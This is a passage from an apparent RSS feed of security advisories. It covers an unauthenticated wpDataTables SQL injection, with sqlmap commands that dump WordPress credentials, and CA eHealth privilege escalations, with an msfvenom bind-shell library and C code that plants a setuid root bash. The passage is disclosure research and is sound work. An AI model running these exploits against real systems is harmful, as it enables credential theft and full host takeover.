price&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Type:&lt;/strong&gt; Integer&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Add the table data via the web interface:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/26aa9c7f9d8767ad9db0cf57f1eafd6d.png&#34; alt=&#34;Creation of the table (2)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Confirm the table with &lt;strong&gt;Create the table&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Open in Excel-like editor&lt;/strong&gt;&lt;br /&gt;Insert two rows with some data , like the following picture, then confirm with &lt;strong&gt;Save Changes&lt;/strong&gt;:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/0a4a1693d5639add992b75de562cb4b1.png&#34; alt=&#34;Creation of the table (3)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Copy the shortcode to the clipboard.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/6238ba8bf4e1c295f29b9990cdf9a606.png&#34; alt=&#34;Creation of the table (4)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Then, create or edit a simple page on WordPress.&lt;br /&gt;In this PoC, it is chosen to edit the default page.&lt;br /&gt;Navigate to: &lt;strong&gt;Pages&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Sample Page&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Edit&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/132f66eee95f83493c49f25bb78a855e.png&#34; alt=&#34;Creation of the page (1)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Paste the page shortcode, in this case: &lt;strong&gt;[wpdatatable id=1]&lt;/strong&gt;&lt;br /&gt;Then, click on &lt;strong&gt;Update&lt;/strong&gt; to save the page.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/33aa96a336b788c7d43069cd2968f7ed.png&#34; alt=&#34;Creation of the page (2)&#34; /&gt;&lt;/p&gt;&lt;p&gt;The link of the page will be: &lt;strong&gt;&lt;a href=&#34;http://hostname/sample-page/&#34;&gt;http://hostname/sample-page/&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Then, log out from the web application.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/637be790f81e4d7b42810dcbce7b3161.png&#34; alt=&#34;Logout from WordPress&#34; /&gt;&lt;/p&gt;&lt;p&gt;Go on the page &lt;strong&gt;&lt;a href=&#34;http://hostname/sample-page/&#34;&gt;http://hostname/sample-page/&lt;/a&gt;&lt;/strong&gt;.&lt;br /&gt;Intercept the browser session with a proxy like &lt;a href=&#34;https://portswigger.net/burp&#34;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;Write &lt;strong&gt;test&lt;/strong&gt; in the &lt;strong&gt;name&lt;/strong&gt; search field:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/cedea38098abea0b260ac6757c21a8cc.png&#34; alt=&#34;Search&#34; /&gt;&lt;/p&gt;&lt;p&gt;The request on Burp Suite will be like the next screenshot.&lt;br /&gt;Please note that there are not WordPress session cookies because it is not necessary to be authenticated for the exploitation of the vulnerability.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/ca0cba7c97c1c8565f1f8c48798130e6.png&#34; alt=&#34;Burp - Search request&#34; /&gt;&lt;/p&gt;&lt;p&gt;Copy the intercepted request, and paste the content a text file named &lt;strong&gt;search.req&lt;/strong&gt;, similar to the following one:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php?action=get_wdtable&amp;amp;table_id=1 HTTP/1.1Host: hostnameUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 800Origin: http://hostnameConnection: closeReferer: http://hostname/sample-page/Cookie: wordpress_test_cookie=WP+Cookie+checkdraw=15&amp;amp;columns%5B0%5D%5Bdata%5D=0&amp;amp;columns%5B0%5D%5Bname%5D=wdt_ID&amp;amp;columns%5B0%5D%5Bsearchable%5D=true&amp;amp;columns%5B0%5D%5Borderable%5D=true&amp;amp;columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&amp;amp;columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&amp;amp;columns%5B1%5D%5Bdata%5D=1&amp;amp;columns%5B1%5D%5Bname%5D=name&amp;amp;columns%5B1%5D%5Bsearchable%5D=true&amp;amp;columns%5B1%5D%5Borderable%5D=true&amp;amp;columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=test&amp;amp;columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&amp;amp;columns%5B2%5D%5Bdata%5D=2&amp;amp;columns%5B2%5D%5Bname%5D=price&amp;amp;columns%5B2%5D%5Bsearchable%5D=true&amp;amp;columns%5B2%5D%5Borderable%5D=true&amp;amp;columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&amp;amp;columns%5B2%5D%5Bsearch%5D%5Bregex%5D=true&amp;amp;order%5B0%5D%5Bcolumn%5D=1&amp;amp;order%5B0%5D%5Bdir%5D=asc&amp;amp;start=0&amp;amp;length=10&amp;amp;search%5Bvalue%5D=&amp;amp;search%5Bregex%5D=false&amp;amp;wdtNonce=c474be8990&amp;amp;sRangeSeparator=%7C&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, use the &lt;a href=&#34;http://sqlmap.org&#34;&gt;&lt;strong&gt;SQLMap&lt;/strong&gt;&lt;/a&gt; tool to exploit the vulnerability with the following command:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sqlmap -r search.req --level=5 --risk=3 --random-agent --dbms=mysql -p &#39;order[0][dir]&#39; --banner&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The banner of the database is gathered as PoC of the vulnerability:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/931cc311b89df01194096c30176e3481.png&#34; alt=&#34;SQLMap - Banner&#34; /&gt;&lt;/p&gt;&lt;p&gt;It is possible to dump all the WordPress database to extract the credentials. If a successful password cracking attack is accomplished, an attacker can use the credentials to login to the WordPress admin page.&lt;br /&gt;To extract the &lt;strong&gt;wp_users&lt;/strong&gt; table, use the following command:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sqlmap -r search.req --level=5 --risk=3 --random-agent --dbms=mysql -p &#39;order[0][dir]&#39; -D wordpress -T wp_users --dump&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/e0c811e1a0f46087662cb676ac5ab1f8.png&#34; alt=&#34;SQLMap - Database dump&#34; /&gt;&lt;/p&gt;&lt;p&gt;The vulnerability is tested on wpDataTables version 3.3, as depicted by the following screenshot:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/4e926145767259dd9b66ad507e7d4e4f.png&#34; alt=&#34;Vulnerable version confirmation - wpDataTables 3.3&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to access all the data in the database and obtain access to the WordPress application, because all the data, including WordPress credentials, can be extracted and cracked.&lt;br /&gt;It is important to note that a valid WordPress administrator account is also able to execute Remote Code Execution attack because of the capability of installing or modifying existing plugins or themes via the web interface. This scenario allows the entire compromise of the target operating system where wpDataTables is installed.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;01/02/2021&lt;/strong&gt;: First disclosure via private ticket on the Technical Support Web Page.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;01/02/2021&lt;/strong&gt;: Near real-time human acknowledge e-mail from Technical Support!&lt;/li&gt;&lt;li&gt;&lt;strong&gt;02/02/2021&lt;/strong&gt;: Released the version 3.4.1, which has the fix for the vulnerability. Very impressive&amp;hellip;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;03/02/2021&lt;/strong&gt;: Update is given that the vulnerability is fixed on version 3.4.1, which was released the day before.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;03/02/2021&lt;/strong&gt;: We have tested the vulnerability on version 3.4.1, which is fixed correctly.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;04/02/2021&lt;/strong&gt;: Updated changelog with credits: &lt;a href=&#34;https://wpdatatables.com/help/whats-new-changelog/&#34;&gt;https://wpdatatables.com/help/whats-new-changelog/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;09/02/2021&lt;/strong&gt;: NVD scored as &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-26754&#34;&gt;&lt;strong&gt;9.8&lt;/strong&gt; (Critical)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
     <item>
       <title>CA eHealth Performance Manager - Multiple Vulnerabilities</title>
       <link>https://n4nj0.github.io/advisories/ca-ehealth-performance-manager/</link>
       <pubDate>Tue, 02 Feb 2021 22:18:00 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/ca-ehealth-performance-manager/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;Me and my colleague Alessandro Sabetta have found five security issues:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;1 - Privilege Escalation via Dynamically Linked Shared Object Library&lt;/strong&gt;: An authenticated operating system &lt;strong&gt;ehealth&lt;/strong&gt; user is able to inject an arbitrary library the eHealth &lt;strong&gt;FtpCollector&lt;/strong&gt; binary executable. Because that binary has SUID/GUID privileges, the user is able to obtain &lt;strong&gt;root&lt;/strong&gt; privileges on the operating system. The issue is tested on x86 architecture.&lt;br /&gt;&lt;strong&gt;2 - Privilege Escalation via Dynamically Linked Shared Object Library&lt;/strong&gt;: An authenticated regular operating system user is able to inject an arbitrary library the eHealth &lt;strong&gt;emtgtctl2&lt;/strong&gt; binary executable. Because that binary has SUID/GUID privileges, the user is able to obtain &lt;strong&gt;ehealth&lt;/strong&gt; privileges on the operating system. The issue is tested on x86 and SPARC architecture.&lt;br /&gt;&lt;strong&gt;3 - Privilege Escalation via SUID/GUID file&lt;/strong&gt;: An authenticated operating system user is able to run code and impersonate the &lt;strong&gt;ehealth&lt;/strong&gt; application user on the operating system, by abusing excessive permissions in the binary executable &lt;strong&gt;runpicEhealth&lt;/strong&gt; executable, which has SUID and GUID permissions.&lt;br /&gt;&lt;strong&gt;4 - Multiple Reflected Cross-site Scripting&lt;/strong&gt;: An authenticated remote user is able to inject arbitrary web script or HTML on multiple endpoints and parameters, due to incorrect sanitization of user-supplied data and achieve a Reflected Cross-Site Scripting attack against other users.&lt;br /&gt;&lt;strong&gt;5 - Improper Restriction of Excessive Authentication Attempts&lt;/strong&gt;: A malicious user is not limited or blocked to perform a brute force attack in the main application login page.&lt;/p&gt;&lt;p&gt;By chaining the &lt;strong&gt;second&lt;/strong&gt; and the &lt;strong&gt;first&lt;/strong&gt; security issues OR the &lt;strong&gt;third&lt;/strong&gt; and the &lt;strong&gt;first&lt;/strong&gt; issues, every operating system user is able to obtain root privileges.&lt;/p&gt;&lt;h2 id=&#34;product-information&#34;&gt;Product Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Product name:&lt;/strong&gt; CA eHealth Performance Manager&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Affected version:&lt;/strong&gt; &amp;lt;= 6.3.2.12&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Product Web Page:&lt;/strong&gt; &lt;a href=&#34;https://support.broadcom.com/external/content/release-announcements/CA-eHealth-End-of-Life-Announcement/4417&#34;&gt;CA eHealth Performance Manager&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;CA eHealth Performance Manager product is aimed to be an advanced network monitor and management solution.&lt;br /&gt;However, during a security auditing of the product, we have found five issues.&lt;br /&gt;The first three are privilege escalation vulnerabilities, the fourth consists in multiple reflected XSS, and the fifth is the possibility to perform a successful brute force attack, without being limited or blocked.&lt;/p&gt;&lt;p&gt;We tried to contact CA PSIRT security team, but they do not recognize the security issues because the product is end-of-life from 01/05/2018. I am releasing the full disclosure for the reason I believe, which is that users have to be informed to make appropriate decisions, especially those who cannot afford an upgrade for several reasons.&lt;/p&gt;&lt;p&gt;It is recommended to migrate to the latest version of &lt;strong&gt;CA Performance Management&lt;/strong&gt;, enforce the permissions on file system, or at least limit the operating systems users on the servers where it is installed.&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;1-privilege-escalation-via-dynamically-linked-shared-object-library-untrusted-search-path-cwe-426&#34;&gt;&lt;strong&gt;1 - Privilege Escalation via Dynamically Linked Shared Object Library (Untrusted Search Path) - CWE-426&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated operating system ehealth user is able to inject an arbitrary library to an application binary executable. Because that binary has SUID/GUID privileges, the user is able to obtain root privileges on the operating system. The issue is tested on x86 and SPARC architectures of the product.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; No special configuration is required to reproduce the issue.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28249&#34;&gt;CVE-2021-28249&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-28249&#34;&gt;&lt;strong&gt;8.8&lt;/strong&gt; (High)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;We discovered a Local Privilege Escalation in CA eHealth Performance Manager &lt;strong&gt;FtpCollector&lt;/strong&gt; executable , which allows relative path (RPATH) dynamic library loading.This vulnerability is exploitable in the default installation and yields full root privileges.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected files and directories&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;File:&lt;/strong&gt; /prods/ehealth632/modules/cndc/bin/FtpCollector&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Directories:&lt;/strong&gt; /opt/ehealth/modules/cndc/bin, /opt/ehealth/lib&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;/prods/ehealth632/modules/cndc/bin/FtpCollector&lt;/code&gt; file has been found to have SUID permissions. Anyone running the file can run a command with the privileges of the user who owns the user, in this case, &lt;strong&gt;root&lt;/strong&gt;.When the file is executed for the first time with the user ehealth, it reports an error message stating that the program does not find the library dynamically loaded &lt;code&gt;libclntsh.so.10.1&lt;/code&gt;, in any folder where the linker search for libraries.&lt;/p&gt;&lt;p&gt;Using the &lt;code&gt;ldd&lt;/code&gt; command it is possible to have a picture of the libraries that are loaded at runtime from the file. The library is not found, as depicted next to the output of &lt;code&gt;libclntsh.so.10.1&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Next, we analyzed the executable file to see if there is a loading configuration via relative path (RPATH) with the &lt;code&gt;objdump&lt;/code&gt; command, to see if the executable file searches for libraries on paths where the attacker can somehow try to write. In the event that there are no RPATH routes, an attacker cannot inject a malicious library.&lt;/p&gt;&lt;p&gt;The following is the evidence of the commands executed for the analysis:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/4d31856e2321a659e28aaaf9139d82f6.png&#34; alt=&#34;1 - Analysis (1)&#34; /&gt;&lt;/p&gt;&lt;p&gt;In this case, the attacker can load a malicious library into the paths:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;/opt/ehealth/modules/cndc/bin&lt;/li&gt;&lt;li&gt;/opt/ehealth/lib&lt;/li&gt;&lt;li&gt;/usr/lib&lt;/li&gt;&lt;li&gt;/usr/local/lib&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Before copying a malicious library into these paths, the attacker checks the permissions of each folder to make sure he can do it.Indeed, the ehealth user can only edit the contents of the folders &lt;code&gt;/opt/ehealth/modules/cndc/bin&lt;/code&gt; and &lt;code&gt;/opt/ehealth/lib&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/8efa9f67e19db797dceee548db800ef4.png&#34; alt=&#34;1 - Analysis (2)&#34; /&gt;&lt;/p&gt;&lt;p&gt;Once all the above conditions have been validated, the attacker creates a malicious library from his machine to obtain root privileges, and then he copies it on the &lt;code&gt;/tmp&lt;/code&gt; folder of the server, which can be modified by all system users.&lt;/p&gt;&lt;p&gt;To create the library for x86 architecture, use the &lt;code&gt;msfvenom&lt;/code&gt; payload generator tool with the following syntax:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p linux/x86/shell_bind_tco PrependSetuid=true LPORT=5556 -f elf-so -o libclntsh.so.10.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/14bd861703989d97b24ecaf78533e6e1.png&#34; alt=&#34;1 - Payload Generation&#34; /&gt;&lt;/p&gt;&lt;p&gt;On the server, the malicious library is copied on path &lt;code&gt;/opt/eHealth/lib&lt;/code&gt;.Finally, it executes the initial command &lt;code&gt;/prods/ehealth632/modules/cndc/bin/FtpCollector&lt;/code&gt;, that is executed with root privileges, because of the SUID bit.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/d39674c7a642e3bbfc39379a8758e10a.png&#34; alt=&#34;1 - Payload Execution&#34; /&gt;&lt;/p&gt;&lt;p&gt;The attacker is able to connect to the shell which is executed with the highest privileges, and obtain complete control of the system.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/311f6667863652ddb5bcbc53b7c395bb.png&#34; alt=&#34;1 - Root privileges&#34; /&gt;&lt;/p&gt;&lt;p&gt;To security issue is present also on SPARC architecture. For example, on Solaris 10, the objdump command can be replaced with &lt;code&gt;elfdump&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/usr/ccs/bin/elfdump -d /prods/ehealth631/modules/cndc/bin/FtpCollector | grep &#39;R*PATH&#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Create manually a library named &lt;code&gt;libroot.c&lt;/code&gt; using the following C code:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;static void inject() __attribute__((constructor));void inject(){    system(&amp;quot;rm -f /tmp/rootbash ; cp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod +s /tmp/rootbash &amp;amp;&amp;amp; /tmp/rootbash -p&amp;quot;);}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Compile the code on Solaris 10 SPARC architecture:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/usr/sfw/bin/gcc -shared -o /tmp/libroot.so -fPIC libroot.c&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PoC on SPARC:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/23d808664afc0b4f695a569d334f8386.png&#34; alt=&#34;1 - SPARC&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to bypass the local ehealth operating system user restrictions and gain root privileges on the machine where the application is installed, so he can accomplish every kind of malicious activity.&lt;/p&gt;&lt;h3 id=&#34;2-privilege-escalation-via-dynamically-linked-shared-object-library-untrusted-search-path-cwe-426&#34;&gt;&lt;strong&gt;2 - Privilege Escalation via Dynamically Linked Shared Object Library (Untrusted Search Path) - CWE-426&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; A regular operating system user is able to inject an arbitrary library to an application binary executable. Because that binary has SUID/GUID privileges, the user is able to obtain privileges on the operating system as the ehealth user. The issue is tested on the SPARC architecture of the product.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; No special configuration is required to reproduce the issue.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28246&#34;&gt;CVE-2021-28246&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-28246&#34;&gt;&lt;strong&gt;7.8&lt;/strong&gt; (High)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;We discovered a Local Privilege Escalation in CA eHealth Performance Manager &lt;strong&gt;emtgtctl2&lt;/strong&gt; executable, which allows relative path (RPATH) dynamic library loading.This vulnerability is exploitable in the default installation and yields the compromise of the &lt;strong&gt;ehealth&lt;/strong&gt; privileges.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected files and directories&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;File:&lt;/strong&gt; /prods/ora10/bin/emtgtctl2&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Directory:&lt;/strong&gt; /prods/ora10/lib&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;/prods/ora10/bin/emtgtctl2&lt;/code&gt; file has been found to have SUID permissions. Anyone running the file can run a command with the privileges of the user who owns the user, in this case, &lt;strong&gt;ehealth&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;Using the &lt;code&gt;ldd&lt;/code&gt; command it is possible to have a picture of the libraries that are loaded at runtime from the file. The first library on the command output of ldd is not present by default on the system, and it is &lt;code&gt;libkstat.so.1&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Next, we analyzed the executable file to see if there is a loading configuration via relative path (RPATH) with the &lt;code&gt;elfdump&lt;/code&gt; command, to see if the executable file searches for libraries on paths where the attacker can somehow try to write. In the event that there are no RPATH routes, an attacker cannot inject a malicious library.&lt;/p&gt;&lt;p&gt;The following command is executed for the analysis:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/usr/ccs/bin/elfdump -d /prods/ora10/bin/emtgtctl2 | grep &#39;R*PATH&#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this case, the attacker can load a malicious library into the paths:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;/opt/SUNWcluster/lib&lt;/li&gt;&lt;li&gt;/opt/ORCLcluster/lib&lt;/li&gt;&lt;li&gt;/prods/ora10/lib32&lt;/li&gt;&lt;li&gt;/prods/ora10/lib&lt;/li&gt;&lt;li&gt;/prods/oral0/sysman/lib32&lt;/li&gt;&lt;li&gt;/prods/oral0/jdk/jre/lib/sparc/client&lt;/li&gt;&lt;li&gt;/prods/oral0/jdk/jre/lib/sparc&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Before copying a malicious library into these paths, the attacker checks the permissions of each folder to make sure he can do it:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;ls -l /prods/ora10/ | grep lib&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Indeed, the ehealth user can only edit the contents of the folder &lt;code&gt;/prods/ora10/lib&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Once all the above conditions have been validated, the attacker creates a malicious library from his machine to obtain ehealth privileges, and then he copies it on the &lt;code&gt;/tmp&lt;/code&gt; folder of the server, which can be modified by all system users.&lt;/p&gt;&lt;p&gt;To create the library for SPARC architecture on Solaris 10, create manually a library named &lt;code&gt;lib.c&lt;/code&gt; using the following C code:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;static void inject() __attribute__((constructor));void inject(){    system(&amp;quot;rm -f /tmp/bash ; cp /bin/bash /tmp/bash &amp;amp;&amp;amp; chmod +s /tmp/bash &amp;amp;&amp;amp; /tmp/bash -p&amp;quot;);}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Compile the code on Solaris 10 SPARC architecture:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/usr/sfw/bin/gcc -shared -o lib.so -fPIC lib.c&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PoC on SPARC:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/0c16369b23a7934185a814acfa50401e.png&#34; alt=&#34;2 - SPARC&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to bypass the local operating system user restrictions and gain ehealth privileges on the machine where the application is installed, so he can execute code to read, write, start and stop eHealth application files and processes.&lt;/p&gt;&lt;h3 id=&#34;3-privilege-escalation-via-suid-guid-file-execution-with-unnecessary-privileges-cwe-250&#34;&gt;&lt;strong&gt;3 - Privilege Escalation via SUID/GUID file (Execution with Unnecessary Privileges) - CWE-250&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated operating system user is able to run code and impersonate the ehealth application user on the operating system, by abusing excessive permissions in a SUID/GUID executable file.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; The user must be able to write to a subfolder in &lt;code&gt;/opt&lt;/code&gt; path.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28250&#34;&gt;CVE-2021-28250&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-28250&#34;&gt;&lt;strong&gt;7.8&lt;/strong&gt; (High)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;We discovered a Local Privilege Escalation in CA eHealth Performance Manager &lt;code&gt;runpicEhealth&lt;/code&gt; executable, which has SUID and GUID permissions. Any user running the file can run a command with the privileges of the user who owns the user or group (in this case, root).&lt;br /&gt;For example, if the &lt;code&gt;/opt/SCRIPT&lt;/code&gt; folder is editable by any user, a simple script can be added and run as an &lt;strong&gt;ehealth&lt;/strong&gt; user.&lt;br /&gt;Under these circumstances, it is normally expect to become root, as the SUID and/or SGID are set and the user and group owner is root.&lt;br /&gt;However, in the specific case the permissions obtained are of ehealth, because the executable file &lt;code&gt;runpicEhealth&lt;/code&gt; performs a switch user (su) to &lt;strong&gt;ehealth&lt;/strong&gt; user.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected files and directories&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;File:&lt;/strong&gt; /prods/smile/bin/runpicEhealth&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Directories:&lt;/strong&gt; /opt&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/a5634c29491e120e9add0b509edf6e15.png&#34; alt=&#34;3 - SUID&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue an attacker is able to bypass the local operating system user restrictions and gain ehealth privileges on the machine where the application is installed, so he can execute code to read, write, start and stop eHealth application files and processes.&lt;/p&gt;&lt;h3 id=&#34;4-multiple-reflected-cross-site-scripting-improper-neutralization-of-input-during-web-page-generation-cross-site-scripting-cwe-79&#34;&gt;&lt;strong&gt;4 - Multiple Reflected Cross-site Scripting - Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - CWE-79&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of user-supplied data and achieve a Reflected Cross-Site Scripting attack against other users.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; No special configuration is required to reproduce the issue.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28247&#34;&gt;CVE-2021-28247&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-28247&#34;&gt;&lt;strong&gt;5.4&lt;/strong&gt; (Medium)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;A remote user, authenticated to eHealth Performance Manager, is able to inject arbitrary web script or HTML into several HTTP GET parameters which reflect the user 